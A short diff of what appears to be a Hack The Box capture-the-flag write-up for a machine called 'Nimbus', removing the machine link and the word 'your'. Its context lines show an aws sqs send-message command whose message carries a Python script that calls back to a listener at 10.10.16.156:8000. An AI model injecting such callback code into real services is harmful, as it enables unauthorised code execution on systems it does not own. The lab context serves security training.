@@ -1,5 +1,5 @@
 Nimbus
-https://app.hackthebox.com/machines/Nimbus
+
 
 
 Summary
@@ -300,7 +300,7 @@ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
     "runtime": "python3.11",
     "script": "import urllib.request; urllib.request.urlopen(\"http://10.10.16.156:8000/callback\")"
   }'
-Then watch your listener:
+Then watch  listener:
 
 
 Copy
